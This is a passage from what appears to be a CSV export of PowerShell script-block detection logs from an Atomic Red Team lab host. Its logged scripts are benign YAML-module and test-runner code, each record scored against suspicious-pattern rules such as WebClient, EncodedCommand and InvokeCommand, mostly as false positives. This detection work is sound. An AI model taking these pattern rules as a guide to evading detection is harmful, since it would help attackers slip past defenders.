                                # Prefix is either missing or is a +
                                return [double]::PositiveInfinity
                            }
                        }
                    }
                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as double"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:timestamp"" {
                    # From the YAML spec: http://yaml.org/type/timestamp.html
                    [DateTime]$parsedValue = [DateTime]::MinValue
                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)
                    $tss = $ts.ToString(""o"")
                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {
                        Throw (""failed to parse scalar {0} as DateTime"" -f $Node)
                    }
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain')
        {
            $types = @([int], [long], [double], [boolean], [decimal])
            foreach($i in $types){
                $parsedValue = New-Object -TypeName $i.FullName
                if ($i.IsAssignableFrom([boolean])){
                    $result = $i::TryParse($Node,[ref]$parsedValue) 
                } else {
                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)
                }
                if( $result ) {
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {
            return $null
        }

        return $Node.Value
    }
}

function Convert-YamlMappingToHashtable {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,
        [switch] $Ordered
    )
    PROCESS {
        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }
        foreach($i in $Node.Children.Keys) {
            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered
        }
        return $ret
    }
}

function Convert-YamlSequenceToArray {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,
        [switch]$Ordered
    )
    PROCESS {
        $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
        foreach($i in $Node.Children){
            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))
        }
        return ,$ret
    }
}

function Convert-YamlDocumentToPSObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [System.Object]$Node, 
        [switch]$Ordered
    )
    PROCESS {
        switch($Node.GetType().FullName){
            ""YamlDotNet.RepresentationModel.YamlMappingNode""{
                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlSequenceNode"" {
                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlScalarNode"" {
                return (Convert-ValueToProperType $Node)
            }
        }
    }
}

function Convert-HashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [hashtable]$Data
    )
    foreach($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-OrderedHashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Collections.Specialized.OrderedDictionary] $Data
    )
    foreach ($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-ListToGenericList {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [array]$Data=@()
    )
    $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    for($i=0; $i -lt $Data.Count; $i++) {
        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))
    }
    return ,$ret
}

function Convert-PSCustomObjectToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [PSCustomObject]$Data
    )
    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')
    foreach ($i in $Data.psobject.properties) {
        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value
    }
    return $ret
}

function Convert-PSObjectToGenericObject {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [System.Object]$Data
    )

    if ($null -eq $data) {
        return $data
    }

    $dataType = $data.GetType()
    if ($data -isnot [System.Object]) {
        return $data -as $dataType
    }

    if ($dataType.FullName -eq ""System.Management.Automation.PSCustomObject"") {
        return Convert-PSCustomObjectToDictionary $data
    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){
        return Convert-OrderedHashtableToDictionary $data
    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){
        return Convert-HashtableToDictionary $data
    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {
        return Convert-ListToGenericList $data
    }
    return $data -as $dataType
}

function ConvertFrom-Yaml {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]
        [string]$Yaml,
        [switch]$AllDocuments=$false,
        [switch]$Ordered,
        [switch]$UseMergingParser=$false
    )

    BEGIN {
        $d = """"
    }
    PROCESS {
        if($Yaml -is [string]) {
            $d += $Yaml + ""`n""
        }
    }

    END {
        if($d -eq """"){
            return
        }
        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser
        if (!$documents.Count) {
            return
        }
        if($documents.Count -eq 1){
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        if(!$AllDocuments) {
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        $ret = @()
        foreach($i in $documents) {
            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered
        }
        return $ret
    }
}

$stringQuotingEmitterSource = @""
using System;
using System.Text.RegularExpressions;
using YamlDotNet;
using YamlDotNet.Core;
using YamlDotNet.Serialization;
using YamlDotNet.Serialization.EventEmitters;
public class StringQuotingEmitter: ChainedEventEmitter {
    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356
    private static Regex quotedRegex = new Regex(@`""^(\~|null|true|false|on|off|yes|no|y|n|[-+]?(\.[0-9]+|[0-9]+(\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\.inf))?$`"", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    public StringQuotingEmitter(IEventEmitter next): base(next) {}

    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {
        var typeCode = eventInfo.Source.Value != null
        ? Type.GetTypeCode(eventInfo.Source.Type)
        : TypeCode.Empty;

        switch (typeCode) {
            case TypeCode.Char:
                if (Char.IsDigit((char)eventInfo.Source.Value)) {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                }
                break;
            case TypeCode.String:
                var val = eventInfo.Source.Value.ToString();
                if (quotedRegex.IsMatch(val))
                {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                } else if (val.IndexOf('\n') > -1) {
                    eventInfo.Style = ScalarStyle.Literal;
                }
                break;
        }

        base.Emit(eventInfo, emitter);
    }

    public static SerializerBuilder Add(SerializerBuilder builder) {
        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));
    }
}
""@

if (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {
    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)
    if ($PSVersionTable.PSEdition -eq ""Core"") {
        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions ""-nowarn:1701""
    } else {
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp
    }
}

function Get-Serializer {
    Param(
        [Parameter(Mandatory=$true)][SerializationOptions]$Options
    )
    
    $builder = New-Object ""YamlDotNet.Serialization.SerializerBuilder""
    
    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {
        $builder = $builder.EnsureRoundtrip()
    }
    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {
        $builder = $builder.DisableAliases()
    }
    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {
        $builder = $builder.EmitDefaults()
    }
    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {
        $builder = $builder.JsonCompatible()
    }
    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {
        $builder = $builder.WithTypeResolver((New-Object ""YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver""))
    }
    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {
        $builder = $builder.WithIndentedSequences()
    }
    $builder = [StringQuotingEmitter]::Add($builder)
    return $builder.Build()
}

function ConvertTo-Yaml {
    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]
    Param(
        [Parameter(ValueFromPipeline = $true, Position=0)]
        [System.Object]$Data,

        [string]$OutFile,

        [Parameter(ParameterSetName = 'Options')]
        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,

        [Parameter(ParameterSetName = 'NoOptions')]
        [switch]$JsonCompatible,
        
        [switch]$KeepArray,

        [switch]$Force
    )
    BEGIN {
        $d = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    }
    PROCESS {
        if($data -is [System.Object]) {
            $d.Add($data)
        }
    }
    END {
        if ($d -eq $null -or $d.Count -eq 0) {
            return
        }
        if ($d.Count -eq 1 -and !($KeepArray)) {
            $d = $d[0]
        }
        $norm = Convert-PSObjectToGenericObject $d
        if ($OutFile) {
            $parent = Split-Path $OutFile
            if (!(Test-Path $parent)) {
                Throw ""Parent folder for specified path does not exist""
            }
            if ((Test-Path $OutFile) -and !$Force) {
                Throw ""Target file already exists. Use -Force to overwrite.""
            }
            $wrt = New-Object ""System.IO.StreamWriter"" $OutFile
        } else {
            $wrt = New-Object ""System.IO.StringWriter""
        }
    
        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {
            $Options = 0
            if ($JsonCompatible) {
                # No indent options :~(
                $Options = [SerializationOptions]::JsonCompatible
            }
        }

        try {
            $serializer = Get-Serializer $Options
            $serializer.Serialize($wrt, $norm)
        }
        catch{
            $_
        }
        finally {
            $wrt.Close()
        }
        if ($OutFile) {
            return
        } else {
            return $wrt.ToString()
        }
    }
}

New-Alias -Name cfy -Value ConvertFrom-Yaml
New-Alias -Name cty -Value ConvertTo-Yaml

Export-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:54 PM","35710518","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","5396","
$artConfig = [PSCustomObject]@{

  # [optional] These two configs are calculated programatically, you probably don't need to change them
  basehostname               = $((hostname | Select-String -Pattern ""(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$"").Matches.Groups[1].value)
  OS                         = $( if ($IsLinux) { ""linux"" } elseif ($IsMacOS) { ""macos"" } else { ""windows"" })

  # [optional(if using default install paths)] Paths to your Atomic Red Team ""atomics"" folder and your ""invoke-atomicredteam"" folder
  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""/AtomicRedTeam/invoke-atomicredteam"" # this is the default install path so you probably don't need to change this
  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""AtomicRedTeam/atomics"" # this is the default install path so you probably don't need to change this
  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })   ""PrivateAtomics/atomics"" # if you aren't providing your own private atomics that are custom written by you, just leave this as is

  # [ Optional ] The user that will be running each atomic test
  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { ""$env:USERDOMAIN\$env:USERNAME"" }) # example ""corp\atomicrunner""

  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory
  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example ""C:\Users\atomicrunner""

  # [optional]
  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete
  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner
  scheduleFileName           = ""AtomicRunnerSchedule.csv""

  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger
  LoggingModule              = ''

  # [optional] Syslog configuration, default execution logs will be sent to this server:port
  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\)
  syslogPort                 = 514
  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS

  verbose                    = $true; # set to true for more log output

  # [optional] logfile filename configs
  logFolder                  = ""AtomicRunner-Logs""
  timeLocal                  = (Get-Date(get-date) -uformat ""%Y-%m-%d"").ToString()
  logFileName                = ""$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv""

  # amsi bypass script block (applies to Windows only)
  absb                       = $null

  # AtomicRunnerService install directory
  ServiceInstallDir                 = ""${ENV:windir}\System32""

}

# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values
$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
$pathToPrivateConfig = Join-Path $root ""privateConfig.ps1""
if (Test-Path ($pathToPrivateConfig)) {
  if ($IsLinux -or $IsMacOS) {
    chmod +x $pathToPrivateConfig
  }
  & ($pathToPrivateConfig)
}

#####################################################################################
# All of the configs below are calculated using the script block in the ""Value"" field.
# This way, when you change the 'basePath' everything else is updated.
# You should probably leave all of the stuff below alone.
#####################################################################################

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""runnerFolder""
  Value       = { Join-Path $artConfig.basePath ""AtomicRunner"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""atomicLogsPath""
  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""scheduleFile""
  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""credFile""
  Value       = { Join-Path $artConfig.runnerFolder ""psc_$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""execLogPath""
  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""stopFile""
  Value       = { Join-Path $artConfig.runnerFolder ""stop.txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""logFile""
  Value       = { Join-Path $artConfig.atomicLogsPath ""log-$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:54 PM","35710543","6",", EncodedCommand, SuspiciousCmdlet, Get","EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]","431","function Get-PreferredIPAddress($isWindows) {
    if ($isWindows) {
        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne ""WellKnown"" }).IPAddress
    }
    elseif ($IsMacOS) {
        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr
    }
    elseif ($IsLinux) {
        return ip -4 -br addr show | sed -n -e 's/^.*UP\s* //p' | cut -d ""/"" -f 1
    }
    else {
        return ''
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e ''
Pattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
"12/16/2024 8:34:53 PM","35710487","5",", WebClient","WebClient [Score: 5]","1762","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Module manifest for module 'powershell-yaml'
#
# Generated by: Gabriel Adrian Samfira
#
# Generated on: 10/01/2016
#

@{

# Script module or binary module file associated with this manifest.
RootModule = 'powershell-yaml.psm1'

# Version number of this module.
ModuleVersion = '0.4.7'

# ID used to uniquely identify this module
GUID = '6a75a662-7f53-425a-9777-ee61284407da'

# Author of this module
Author = 'Gabriel Adrian Samfira','Alessandro Pilotti'

# Company or vendor of this module
CompanyName = 'Cloudbase Solutions SRL'

# Copyright statement for this module
Copyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'

# Description of the functionality provided by this module
Description = 'Powershell module for serializing and deserializing YAML'

# Minimum version of the Windows PowerShell engine required by this module
PowerShellVersion = '3.0'

# Script files (.ps1) that are run in the caller's environment prior to importing this module.
ScriptsToProcess = @(""Load-Assemblies.ps1"")

# Functions to export from this module
FunctionsToExport = ""ConvertTo-Yaml"",""ConvertFrom-Yaml""

AliasesToExport = ""cfy"",""cty""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:57 PM","35711100","5",", Get, InvokeCommand","Get [Score: 1]; InvokeCommand [Score: 4]","1770","function Get-TargetInfo($Session) {
    $tmpDir = ""$env:TEMP\""
    $isElevated = $false
    $targetHostname = hostname
    $targetUser = whoami
    if ($Session) {
        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {
            $targetPlatform = ""windows""
            $tmpDir = ""/tmp/""
            $targetHostname = hostname
            $targetUser = whoami
            if ($IsLinux) { $targetPlatform = ""linux"" }
            elseif ($IsMacOS) { $targetPlatform = ""macos"" }
            else {
                # windows
                $tmpDir = ""$env:TEMP\""
                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            }
            if ($IsLinux -or $IsMacOS) {
                $isElevated = $false
                $privid = id -u
                if ($privid -eq 0) { $isElevated = $true }
            }
            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
        } # end ScriptBlock for remote session
    }
    else {
        $targetPlatform = ""linux""
        if ($IsLinux -or $IsMacOS) {
            $tmpDir = ""/tmp/""
            $isElevated = $false
            $privid = id -u
            if ($privid -eq 0) { $isElevated = $true }
            if ($IsMacOS) { $targetPlatform = ""macos"" }
        }
        else {
            $targetPlatform = ""windows""
            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }

    }
    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:54 PM","35710626","5",", WebClient","WebClient [Score: 5]","1762","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Module manifest for module 'powershell-yaml'
#
# Generated by: Gabriel Adrian Samfira
#
# Generated on: 10/01/2016
#

@{

# Script module or binary module file associated with this manifest.
RootModule = 'powershell-yaml.psm1'

# Version number of this module.
ModuleVersion = '0.4.7'

# ID used to uniquely identify this module
GUID = '6a75a662-7f53-425a-9777-ee61284407da'

# Author of this module
Author = 'Gabriel Adrian Samfira','Alessandro Pilotti'

# Company or vendor of this module
CompanyName = 'Cloudbase Solutions SRL'

# Copyright statement for this module
Copyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'

# Description of the functionality provided by this module
Description = 'Powershell module for serializing and deserializing YAML'

# Minimum version of the Windows PowerShell engine required by this module
PowerShellVersion = '3.0'

# Script files (.ps1) that are run in the caller's environment prior to importing this module.
ScriptsToProcess = @(""Load-Assemblies.ps1"")

# Functions to export from this module
FunctionsToExport = ""ConvertTo-Yaml"",""ConvertFrom-Yaml""

AliasesToExport = ""cfy"",""cty""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:56 PM","35711004","5",", WebClient","WebClient [Score: 5]","1762","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Module manifest for module 'powershell-yaml'
#
# Generated by: Gabriel Adrian Samfira
#
# Generated on: 10/01/2016
#

@{

# Script module or binary module file associated with this manifest.
RootModule = 'powershell-yaml.psm1'

# Version number of this module.
ModuleVersion = '0.4.7'

# ID used to uniquely identify this module
GUID = '6a75a662-7f53-425a-9777-ee61284407da'

# Author of this module
Author = 'Gabriel Adrian Samfira','Alessandro Pilotti'

# Company or vendor of this module
CompanyName = 'Cloudbase Solutions SRL'

# Copyright statement for this module
Copyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'

# Description of the functionality provided by this module
Description = 'Powershell module for serializing and deserializing YAML'

# Minimum version of the Windows PowerShell engine required by this module
PowerShellVersion = '3.0'

# Script files (.ps1) that are run in the caller's environment prior to importing this module.
ScriptsToProcess = @(""Load-Assemblies.ps1"")

# Functions to export from this module
FunctionsToExport = ""ConvertTo-Yaml"",""ConvertFrom-Yaml""

AliasesToExport = ""cfy"",""cty""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:55 PM","35710721","5",", Get, InvokeCommand","Get [Score: 1]; InvokeCommand [Score: 4]","1770","function Get-TargetInfo($Session) {
    $tmpDir = ""$env:TEMP\""
    $isElevated = $false
    $targetHostname = hostname
    $targetUser = whoami
    if ($Session) {
        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {
            $targetPlatform = ""windows""
            $tmpDir = ""/tmp/""
            $targetHostname = hostname
            $targetUser = whoami
            if ($IsLinux) { $targetPlatform = ""linux"" }
            elseif ($IsMacOS) { $targetPlatform = ""macos"" }
            else {
                # windows
                $tmpDir = ""$env:TEMP\""
                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            }
            if ($IsLinux -or $IsMacOS) {
                $isElevated = $false
                $privid = id -u
                if ($privid -eq 0) { $isElevated = $true }
            }
            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
        } # end ScriptBlock for remote session
    }
    else {
        $targetPlatform = ""linux""
        if ($IsLinux -or $IsMacOS) {
            $tmpDir = ""/tmp/""
            $isElevated = $false
            $privid = id -u
            if ($privid -eq 0) { $isElevated = $true }
            if ($IsMacOS) { $targetPlatform = ""macos"" }
        }
        else {
            $targetPlatform = ""windows""
            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }

    }
    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:55 PM","35710817","5",", WebClient","WebClient [Score: 5]","1762","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Module manifest for module 'powershell-yaml'
#
# Generated by: Gabriel Adrian Samfira
#
# Generated on: 10/01/2016
#

@{

# Script module or binary module file associated with this manifest.
RootModule = 'powershell-yaml.psm1'

# Version number of this module.
ModuleVersion = '0.4.7'

# ID used to uniquely identify this module
GUID = '6a75a662-7f53-425a-9777-ee61284407da'

# Author of this module
Author = 'Gabriel Adrian Samfira','Alessandro Pilotti'

# Company or vendor of this module
CompanyName = 'Cloudbase Solutions SRL'

# Copyright statement for this module
Copyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'

# Description of the functionality provided by this module
Description = 'Powershell module for serializing and deserializing YAML'

# Minimum version of the Windows PowerShell engine required by this module
PowerShellVersion = '3.0'

# Script files (.ps1) that are run in the caller's environment prior to importing this module.
ScriptsToProcess = @(""Load-Assemblies.ps1"")

# Functions to export from this module
FunctionsToExport = ""ConvertTo-Yaml"",""ConvertFrom-Yaml""

AliasesToExport = ""cfy"",""cty""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:56 PM","35710912","5",", Get, InvokeCommand","Get [Score: 1]; InvokeCommand [Score: 4]","1770","function Get-TargetInfo($Session) {
    $tmpDir = ""$env:TEMP\""
    $isElevated = $false
    $targetHostname = hostname
    $targetUser = whoami
    if ($Session) {
        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {
            $targetPlatform = ""windows""
            $tmpDir = ""/tmp/""
            $targetHostname = hostname
            $targetUser = whoami
            if ($IsLinux) { $targetPlatform = ""linux"" }
            elseif ($IsMacOS) { $targetPlatform = ""macos"" }
            else {
                # windows
                $tmpDir = ""$env:TEMP\""
                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            }
            if ($IsLinux -or $IsMacOS) {
                $isElevated = $false
                $privid = id -u
                if ($privid -eq 0) { $isElevated = $true }
            }
            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
        } # end ScriptBlock for remote session
    }
    else {
        $targetPlatform = ""linux""
        if ($IsLinux -or $IsMacOS) {
            $tmpDir = ""/tmp/""
            $isElevated = $false
            $privid = id -u
            if ($privid -eq 0) { $isElevated = $true }
            if ($IsMacOS) { $targetPlatform = ""macos"" }
        }
        else {
            $targetPlatform = ""windows""
            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }

    }
    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:54 PM","35710582","5",", Get, InvokeCommand","Get [Score: 1]; InvokeCommand [Score: 4]","1770","function Get-TargetInfo($Session) {
    $tmpDir = ""$env:TEMP\""
    $isElevated = $false
    $targetHostname = hostname
    $targetUser = whoami
    if ($Session) {
        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {
            $targetPlatform = ""windows""
            $tmpDir = ""/tmp/""
            $targetHostname = hostname
            $targetUser = whoami
            if ($IsLinux) { $targetPlatform = ""linux"" }
            elseif ($IsMacOS) { $targetPlatform = ""macos"" }
            else {
                # windows
                $tmpDir = ""$env:TEMP\""
                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            }
            if ($IsLinux -or $IsMacOS) {
                $isElevated = $false
                $privid = id -u
                if ($privid -eq 0) { $isElevated = $true }
            }
            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
